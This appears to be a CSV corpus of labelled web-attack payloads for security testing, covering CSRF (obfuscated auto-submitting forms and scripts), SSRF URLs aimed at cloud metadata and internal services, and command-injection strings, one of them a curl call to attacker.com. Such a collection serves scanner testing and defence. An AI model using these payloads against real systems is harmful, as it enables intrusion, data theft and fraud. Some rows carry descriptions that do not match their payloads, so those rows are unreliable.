id,label,attack_class,type,payload,context,context_bucket,severity,severity_original,severity_reason,is_destructive,destructive_flags,oracle,description,example
csrf-079,attack,csrf,CSRF,<form action='https://app.example.com/settings/notifications' method='POST' id='f'><input name='push_notifications' value='off'/></form><script>document.getElementById('f').submit();</script>,App notification settings,account_settings,medium,medium,base csrf/CSRF=medium,False,[],state_change,CSRF to change victim's notification preferences,
csrf-080,attack,csrf,CSRF,<form action='https://payments.example.com/account/add-card' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>,Payment gateway,account_settings,high,critical,base csrf/CSRF=medium; high-impact CSRF action -> high,False,[],state_change,CSRF to add victim's credit card to attacker's account,
csrf-081,attack,csrf,CSRF,<script>var b='PGZvcm0gYWN0aW9uPSdodHRwczovL3RhcmdldC5jb20vYWN0aW9uL3VwZGF0ZScgbWV0aG9kPSdQT1NUJz48aW5wdXQgbmFtZT0nZGF0YScgdmFsdWU9J2V2aWwnPjwvaW5wdXQ+PC9mb3JtPg==';var d=atob(b);var f=document.createElement('div');f.innerHTML=d;document.body.appendChild(f);f.firstChild.submit();</script>,Dynamic base64 decoded form submission,script_context,medium,high,base csrf/CSRF=medium,False,[],state_change,CSRF with base64 encoded form and dynamic decoding,
csrf-082,attack,csrf,CSRF,<script>eval(unescape('%66%6f%72%6d%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%66%6f%72%6d%27%29%3b%66%6f%72%6d%2e%61%63%74%69%6f%6e%20%3d%20%27%68%74%74%70%73%3a%2f%2f%74%61%72%67%65%74%2e%63%6f%6d%2f%75%70%64%61%74%65%27%3b%66%6f%72%6d%2e%6d%65%74%68%6f%64%20%3d%20%27%50%4f%53%54%27%3b%76%61%72%20%69%6e%70%75%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%69%6e%70%75%74%27%29%3b%69%6e%70%75%74%2e%6e%61%6d%65%20%3d%20%27%64%61%74%61%27%3b%69%6e%70%75%74%2e%76%61%6c%75%65%20%3d%20%27%65%76%69%6c%27%3b%66%6f%72%6d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%69%6e%70%75%74%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%66%6f%72%6d%29%3b%66%6f%72%6d%2e%73%75%62%6d%69%74%28%29%3b'));</script>,Hex encoded script with eval,script_context,medium,high,base csrf/CSRF=medium,False,[],state_change,CSRF with hex encoded script and eval,
csrf-083,attack,csrf,CSRF,"<script>var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/transfer"" method=""POST"" id=""f""><input name=""amount"" value=""1000""/></form><script>document.getElementById(\'f\').submit();</script>');d.close();</script>",Dynamic iframe with form,script_context,high,high,base csrf/CSRF=medium; high-impact CSRF action -> high,False,[],state_change,CSRF with dynamically created iframe and delayed form submission,
csrf-084,attack,csrf,CSRF,<script>var a='ht';var b='tps://';var c='target';var d='.com';var e='/api/evil';var f=document.createElement('form');f.action=a+b+c+d+e;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,String concatenation obfuscation,script_context,medium,high,base csrf/CSRF=medium,False,[],state_change,CSRF with obfuscated string concatenation,
csrf-085,attack,csrf,CSRF,"<form action='https://target.com/api/settings' method='POST' id='f'><input name='mode' value='stealth'/></form><div onmouseover='document.getElementById(""f"").submit()'>Hover me</div>",User interaction triggered CSRF,attacker_page,medium,medium,base csrf/CSRF=medium,False,[],state_change,CSRF with event-triggered form submission on mouseover,
csrf-086,attack,csrf,CSRF,"<script>setTimeout(function(){var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},3000);</script>",Delayed form submission,form_field,medium,high,base csrf/CSRF=medium,False,[],state_change,CSRF with delayed execution using setTimeout and obfuscated function,
csrf-087,attack,csrf,CSRF,<script>var p=decodeURIComponent('%66%6f%72%6d');var f=document.createElement(p);f.action='https://target.com/api/update';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,Encoded element creation,script_context,medium,high,base csrf/CSRF=medium,False,[],state_change,CSRF with encoded URI components and dynamic decoding,
csrf-088,attack,csrf,CSRF,"<iframe id='f' style='display:none'></iframe><script>var i=document.getElementById('f');i.src='about:blank';i.onload=function(){var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/steal"" method=""POST"" id=""form""><input name=""data"" value=""evil""/></form>');d.close();d.getElementById('form').submit();};</script>",Stealth iframe with postMessage,script_context,medium,critical,base csrf/CSRF=medium,False,[],state_change,CSRF with stealth iframe and form submission via postMessage,
csrf-089,attack,csrf,CSRF,<script>var s='ht'+'tp'+'s:'+'//ta'+'rget.com/api/evil';var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,String split and join obfuscation,script_context,medium,high,base csrf/CSRF=medium,False,[],state_change,CSRF with obfuscated script using string split and join,
csrf-090,attack,csrf,CSRF,"<div id='container'></div><script>document.getElementById('container').innerHTML='<form action=""https://target.com/api/hack"" method=""POST"" id=""f""><input name=""data"" value=""evil""/></form><script>document.getElementById(\'f\').submit();</script>';</script>",Script injection via innerHTML,script_context,medium,critical,base csrf/CSRF=medium,False,[],state_change,CSRF with script tag injection via innerHTML,
csrf-091,attack,csrf,CSRF,<script>eval(atob('dmFyIGY9ZG9jdW1lbnQuYWxlbWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7IGYuYWN0aW9uID0naHR0cHM6Ly90YXJnZXQuY29tL2FwaS9leGl0JztmLm1ldGhvZCA9J1BPU1QnOyB2YXIgaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7IGku bmFtZSA9J2RhdGEnOyBpLnZhbHVlID0nZXZpbCc7IGYucGFzc0NoaWxkKGlpKTsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTsgZi5zdWJtaXQoKTs='));</script>,Base64 encoded eval obfuscation,script_context,medium,critical,base csrf/CSRF=medium,False,[],state_change,CSRF with obfuscated base64 and eval,
csrf-092,attack,csrf,CSRF,"<svg xmlns='http://www.w3.org/2000/svg'><script><![CDATA[fetch('https://target.com/api/evil',{method:'POST',body:'data=evil'})]]></script></svg>",SVG embedded script,script_context,medium,high,base csrf/CSRF=medium,False,[],state_change,CSRF with SVG image and embedded script,
csrf-093,attack,csrf,CSRF,<meta http-equiv='refresh' content='0;url=https%3A%2F%2Ftarget.com%2Fapi%2Fupdate%3Fdata%3Devil'/>,Meta refresh with URL encoding,url_param,medium,medium,base csrf/CSRF=medium,False,[],state_change,CSRF with meta refresh and URL encoded payload,
csrf-094,attack,csrf,CSRF,"<a href=""javascript:(function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})()"">Click me</a>",JavaScript URL with obfuscation,script_context,medium,high,base csrf/CSRF=medium,False,[],state_change,CSRF with JavaScript URL and obfuscated payload,
csrf-095,attack,csrf,CSRF,"<img src='invalid.jpg' onerror=""var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();"" style='display:none'/>",Image onerror event trigger,script_context,medium,high,base csrf/CSRF=medium,False,[],state_change,CSRF with hidden image and onerror event,
csrf-096,attack,csrf,CSRF,<script>var a=\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074;var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,Unicode escape obfuscation,script_context,medium,high,base csrf/CSRF=medium,False,[],state_change,CSRF with obfuscated Unicode escapes,
csrf-097,attack,csrf,CSRF,"<div style=""width:expression((function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})())""></div>",CSS expression injection,script_context,medium,high,base csrf/CSRF=medium,False,[],state_change,CSRF with CSS expression to trigger script,
csrf-098,attack,csrf,CSRF,"<script>var xhr=new XMLHttpRequest();var u='https://target.com/api/evil';xhr.open('POST',u,true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('data=evil');</script>",XHR POST request,comment_field,medium,critical,base csrf/CSRF=medium,False,[],state_change,CSRF with XMLHttpRequest and obfuscated URL,
csrf-099,attack,csrf,CSRF,<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><form action='https://target.com/api/evil' method='POST' id='f' style='animation:x 1s forwards' onanimationend='this.submit()'><input name='data' value='evil'/></form>,CSS animation event trigger,script_context,medium,medium,base csrf/CSRF=medium,False,[],state_change,CSRF with form submission triggered by CSS animation,
csrf-100,attack,csrf,CSRF,"<script>var s=['ht','tp','s:','//','target','.com','/api','/evil'].join('');var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>",Array join obfuscation,script_context,medium,high,base csrf/CSRF=medium,False,[],state_change,CSRF with obfuscated script using array join,
ssrf-001,attack,ssrf,SSRF,http://127.0.0.1/,Access internal localhost service,ssrf_target,high,high,base ssrf/SSRF=high,False,[],out_of_band,Basic SSRF to internal IP,
ssrf-002,attack,ssrf,SSRF,http://192.168.1.1/,Access internal network device,ssrf_target,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal private IP range,
ssrf-003,attack,ssrf,SSRF,http://169.254.169.254/latest/meta-data/,AWS EC2 instance metadata,ssrf_target,critical,critical,base ssrf/SSRF=high; cloud-metadata endpoint -> critical,False,[],out_of_band,SSRF to metadata service on AWS,
ssrf-004,attack,ssrf,SSRF,http://metadata.google.internal/computeMetadata/v1/,Google Cloud metadata,ssrf_target,critical,critical,base ssrf/SSRF=high; cloud-metadata endpoint -> critical,False,[],out_of_band,SSRF to GCP metadata service,
ssrf-005,attack,ssrf,SSRF,http://169.254.169.254/metadata/instance?api-version=2021-02-01,Azure VM metadata,ssrf_target,critical,critical,base ssrf/SSRF=high; cloud-metadata endpoint -> critical,False,[],out_of_band,SSRF to Azure instance metadata,
ssrf-006,attack,ssrf,SSRF,redis://127.0.0.1:6379,Access internal Redis,ssrf_target,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal Redis service,
ssrf-007,attack,ssrf,SSRF,memcached://127.0.0.1:11211,Access internal Memcached,ssrf_target,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal Memcached service,
ssrf-008,attack,ssrf,SSRF,ftp://127.0.0.1/,Access internal FTP,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal FTP server,
ssrf-009,attack,ssrf,SSRF,smb://192.168.1.100/share,Access internal SMB share,ssrf_target,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal SMB share,
ssrf-010,attack,ssrf,SSRF,http://127.0.0.1:2375/containers/json,Access Docker API,api_json,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal Docker API,
ssrf-011,attack,ssrf,SSRF,https://kubernetes.default.svc/api,Access Kubernetes API,api_json,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal Kubernetes API,
ssrf-012,attack,ssrf,SSRF,http://127.0.0.1:8080/api/json,Access Jenkins API,api_json,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal Jenkins API,
ssrf-013,attack,ssrf,SSRF,http://127.0.0.1:9200/_cat/indices?v,Access Elasticsearch,search_field,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal Elasticsearch cluster,
ssrf-014,attack,ssrf,SSRF,http://127.0.0.1:15672/api/overview,Access RabbitMQ API,api_json,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal RabbitMQ management API,
ssrf-015,attack,ssrf,SSRF,mysql://127.0.0.1:3306,Access MySQL service,ssrf_target,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal MySQL service,
ssrf-016,attack,ssrf,SSRF,postgresql://127.0.0.1:5432,Access PostgreSQL service,comment_field,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal PostgreSQL service,
ssrf-017,attack,ssrf,SSRF,smtp://127.0.0.1:25,Access SMTP server,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal SMTP server,
ssrf-018,attack,ssrf,SSRF,snmp://127.0.0.1,Access SNMP service,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal SNMP service,
ssrf-019,attack,ssrf,SSRF,ldap://127.0.0.1:389,Access LDAP service,ssrf_target,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal LDAP service,
ssrf-020,attack,ssrf,SSRF,http://127.0.0.1/../../../../etc/passwd,Attempt path traversal via SSRF,ssrf_target,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF to internal HTTP service with path traversal,
ssrf-021,attack,ssrf,SSRF,http://%31%39%32.%31%36%38.%31.%31/,URL encoded internal IP,ssrf_target,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with URL encoded internal IP,
ssrf-022,attack,ssrf,SSRF,http://0300.0250.0001.0001/,Octal encoded IP address,script_context,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with octal encoded IP,
ssrf-023,attack,ssrf,SSRF,http://3232235777/,Decimal encoded IP address,script_context,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with decimal encoded IP,
ssrf-024,attack,ssrf,SSRF,http://[::1]/,IPv6 localhost,other,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with IPv6 loopback,
ssrf-025,attack,ssrf,SSRF,file:///etc/passwd,Local file read attempt,command_exec,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with file protocol to read local file,
ssrf-026,attack,ssrf,SSRF,gopher://127.0.0.1:6379/_SET%20key%201%0D%0A,Gopher protocol to Redis,ssrf_target,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with gopher protocol to send raw TCP,
ssrf-027,attack,ssrf,SSRF,"data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1NSRiBFeHBlcmltZW50Jyk8L3NjcmlwdD4=",Data URI with embedded script,script_context,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with data URI scheme,
ssrf-028,attack,ssrf,SSRF,javascript:alert('SSRF'),JavaScript URI scheme,ssrf_target,high,low,base ssrf/SSRF=high,False,[],out_of_band,SSRF with javascript URI scheme,
ssrf-029,attack,ssrf,SSRF,file:///proc/self/environ,Access process environment,command_exec,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with file descriptor access,
ssrf-030,attack,ssrf,SSRF,http://%31%32%37.%30.%30.%31%2F%2E%2E%2F%2E%2E%2Fetc/passwd,Nested URL encoded path traversal,ssrf_target,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with nested URL encoding,
ssrf-031,attack,ssrf,SSRF,ftp://127.0.0.1/../../../../etc/passwd,FTP directory traversal,ssrf_target,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with FTP protocol and directory traversal,
ssrf-032,attack,ssrf,SSRF,smb://127.0.0.1/../../../../Windows/System32/drivers/etc/hosts,SMB UNC path traversal,ssrf_target,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with SMB protocol and UNC path,
ssrf-033,attack,ssrf,SSRF,http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a,HTTP request smuggling,ssrf_target,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP request smuggling attempt,
ssrf-034,attack,ssrf,SSRF,"http://127.0.0.1:80/
X-Injected-Header: evil",HTTP header injection,http_header,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP header injection,
ssrf-035,attack,ssrf,SSRF,http://admin:password@127.0.0.1/admin,Basic auth credentials,login_form,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP basic auth to internal service,
ssrf-036,attack,ssrf,SSRF,http://external.com/redirect?url=http://127.0.0.1/,Redirect to internal IP,ssrf_target,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP redirect to internal IP,
ssrf-037,attack,ssrf,SSRF,http://evil.com/,DNS rebinding to internal IP,ssrf_target,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with DNS rebinding attack,
ssrf-038,attack,ssrf,SSRF,http://[::ffff:127.0.0.1]/,IPv4 mapped IPv6,other,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with IPv4 mapped IPv6 address,
ssrf-039,attack,ssrf,SSRF,http://127.0.0.1/%0a%0d,Encoded newline injection,script_context,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with encoded newline characters,
ssrf-040,attack,ssrf,SSRF,http://127.0.0.1/?_method=POST,Method override parameter,url_param,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP POST method override,
ssrf-041,attack,ssrf,SSRF,http://127.0.0.1/chunked,Chunked transfer encoding test,account_settings,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP chunked transfer encoding,
ssrf-042,attack,ssrf,SSRF,http://127.0.0.1/trace,HTTP TRACE method test,url_param,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP TRACE method,
ssrf-043,attack,ssrf,SSRF,http://127.0.0.1/options,HTTP OPTIONS method test,url_param,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP OPTIONS method,
ssrf-044,attack,ssrf,SSRF,http://127.0.0.1/connect,HTTP CONNECT method test,url_param,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP CONNECT method,
ssrf-045,attack,ssrf,SSRF,http://127.0.0.1/patch,HTTP PATCH method test,url_param,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP PATCH method,
ssrf-046,attack,ssrf,SSRF,http://127.0.0.1/delete,HTTP DELETE method test,url_param,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP DELETE method,
ssrf-047,attack,ssrf,SSRF,http://127.0.0.1/put,HTTP PUT method test,url_param,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP PUT method,
ssrf-049,attack,ssrf,SSRF,"http://127.0.0.1/
X-Forwarded-For: 127.0.0.1",Inject X-Forwarded-For header,http_header,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP header injection via URL,
ssrf-050,attack,ssrf,SSRF,http://127.0.0.1@evil.com/,Userinfo section in URL,url_param,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP userinfo section to bypass filters,
ssrf-051,attack,ssrf,SSRF,dict://127.0.0.1/,Access internal dictionary service,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with dict protocol to query dictionary service,
ssrf-052,attack,ssrf,SSRF,telnet://127.0.0.1:23,Access internal telnet service,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with telnet protocol,
ssrf-053,attack,ssrf,SSRF,"ldap://127.0.0.1:389/ou=users,dc=example,dc=com?uid",LDAP query,ssrf_target,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with ldap protocol to query LDAP server,
ssrf-054,attack,ssrf,SSRF,rdp://127.0.0.1:3389,Access internal RDP service,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with rdp protocol,
ssrf-055,attack,ssrf,SSRF,smb://127.0.0.1/share,Access SMB share,ssrf_target,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with smb protocol to access Windows share,
ssrf-056,attack,ssrf,SSRF,nfs://127.0.0.1/export,Access NFS export,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with nfs protocol,
ssrf-057,attack,ssrf,SSRF,imap://127.0.0.1:143,Access IMAP mail server,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with imap protocol,
ssrf-058,attack,ssrf,SSRF,pop3://127.0.0.1:110,Access POP3 mail server,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with pop3 protocol,
ssrf-059,attack,ssrf,SSRF,mqtt://127.0.0.1:1883,Access MQTT broker,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with mqtt protocol,
ssrf-060,attack,ssrf,SSRF,ws://127.0.0.1:8080/,Access WebSocket service,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with ws protocol (WebSocket),
ssrf-061,attack,ssrf,SSRF,wss://127.0.0.1:8443/,Access secure WebSocket service,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with wss protocol (Secure WebSocket),
ssrf-062,attack,ssrf,SSRF,bitcoin://127.0.0.1/,Bitcoin protocol scheme,ssrf_target,high,low,base ssrf/SSRF=high,False,[],out_of_band,SSRF with bitcoin protocol,
ssrf-063,attack,ssrf,SSRF,magnet:?xt=urn:btih:abcdef1234567890,Magnet link protocol,ssrf_target,high,low,base ssrf/SSRF=high,False,[],out_of_band,SSRF with magnet protocol,
ssrf-064,attack,ssrf,SSRF,ssh://127.0.0.1:22,Access SSH service,other,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with ssh protocol,
ssrf-065,attack,ssrf,SSRF,tel:+1234567890,Telephone protocol,ssrf_target,high,low,base ssrf/SSRF=high,False,[],out_of_band,SSRF with tel protocol,
ssrf-066,attack,ssrf,SSRF,sms:+1234567890,SMS protocol,ssrf_target,high,low,base ssrf/SSRF=high,False,[],out_of_band,SSRF with sms protocol,
ssrf-067,attack,ssrf,SSRF,"geo:37.786971,-122.399677",Geolocation protocol,ssrf_target,high,low,base ssrf/SSRF=high,False,[],out_of_band,SSRF with geo protocol,
ssrf-068,attack,ssrf,SSRF,svn://127.0.0.1/repo,Subversion protocol,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with svn protocol,
ssrf-069,attack,ssrf,SSRF,git://127.0.0.1/repo.git,Git protocol,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with git protocol,
ssrf-070,attack,ssrf,SSRF,sftp://127.0.0.1/home/user/,Secure FTP protocol,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with sftp protocol,
ssrf-071,attack,ssrf,SSRF,http://%2531%25327%2532%253E%253E%253E/,Double URL encoded IP,script_context,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with double URL encoding,
ssrf-072,attack,ssrf,SSRF,HtTp://127.0.0.1/,Mixed case HTTP scheme,ssrf_target,high,medium,base ssrf/SSRF=high,False,[],out_of_band,SSRF with mixed case scheme to bypass filters,
ssrf-073,attack,ssrf,SSRF,http://127.0.0.1%00.example.com/,Null byte injection,other,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with embedded null byte to bypass filters,
ssrf-074,attack,ssrf,SSRF,"http://127.0.0.1/
Set-Cookie:evil=1",CRLF injection,other,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with CRLF injection in URL,
ssrf-076,attack,ssrf,SSRF,http://[::ffff:192.168.1.1]:8080/,IPv6 embedded IPv4 with port,other,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with IPv6 embedded IPv4 and port,
ssrf-078,attack,ssrf,SSRF,http://127.0.0.1/%0d%0aX-Injected-Header:evil,HTTP header injection,http_header,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP header injection via URL encoding,
ssrf-080,attack,ssrf,SSRF,file:///etc/passwd%00,File read with null byte,command_exec,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with file protocol and directory traversal,
ssrf-081,attack,ssrf,SSRF,http://admin%3Apassword@127.0.0.1/,Basic auth with encoding,login_form,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP basic auth and URL encoding,
ssrf-091,attack,ssrf,SSRF,http://0x7f.0x0.0x0.0x1/,Hexadecimal IPv4 address,script_context,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with IPv4 in hexadecimal,
ssrf-092,attack,ssrf,SSRF,http://127.1/,Shortened IPv4 address,other,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with IPv4 in mixed notation,
ssrf-093,attack,ssrf,SSRF,http://2130706433/,Integer IPv4 address,other,high,high,base ssrf/SSRF=high,False,[],out_of_band,SSRF with IPv4 in integer format,
ssrf-095,attack,ssrf,SSRF,http://127.0.0.1/#fragment,URL fragment,url_param,high,low,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP URL fragment,
ssrf-096,attack,ssrf,SSRF,http://127.0.0.1/?param=value,Query parameter,url_param,high,low,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP URL query parameter injection,
ssrf-098,attack,ssrf,SSRF,http://127.0.0.1/%2e%2e/%2e%2e%2e/%2e%2e/%2e%2e/etc/passwd,URL encoded path traversal,ssrf_target,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP URL encoded path traversal,
ssrf-099,attack,ssrf,SSRF,http://127.0.0.1/%2f%2f/etc/passwd,Encoded double slash,script_context,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP URL encoded double slash,
ssrf-100,attack,ssrf,SSRF,http://%31%32%37.%30.%30.%31/%2E%2E/%2e%2e/%2E%2e/etc/passwd,Mixed encoding and case path traversal,ssrf_target,high,critical,base ssrf/SSRF=high,False,[],out_of_band,SSRF with HTTP URL with mixed encoding and case,
cmdinj-001,attack,cmdi,Command Injection,; ls -la,Inject list directory command,command_exec,high,high,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,Basic command injection with semicolon,
cmdinj-002,attack,cmdi,Command Injection,&& cat /etc/passwd,Inject read passwd file,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with && operator,
cmdinj-003,attack,cmdi,Command Injection,| whoami,Inject whoami command,command_exec,high,high,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,Command injection with pipe operator,
cmdinj-004,attack,cmdi,Command Injection,id,Inject id command using backticks,command_exec,high,high,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,Command injection with backticks,
cmdinj-005,attack,cmdi,Command Injection,$(uname -a),Inject uname command,command_exec,high,high,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,Command injection with $() syntax,
cmdinj-006,attack,cmdi,Command Injection,$(echo $(whoami)),Nested command substitution,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with nested $(),
cmdinj-007,attack,cmdi,Command Injection,& sleep 10,Inject sleep command for timing attack,command_exec,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with ampersand and sleep,
cmdinj-008,attack,cmdi,Command Injection,&& echo 'injected',Inject command with newline,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with newline character,
cmdinj-009,attack,cmdi,Command Injection,; curl http://attacker.com,Exfiltrate data via curl,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and curl,
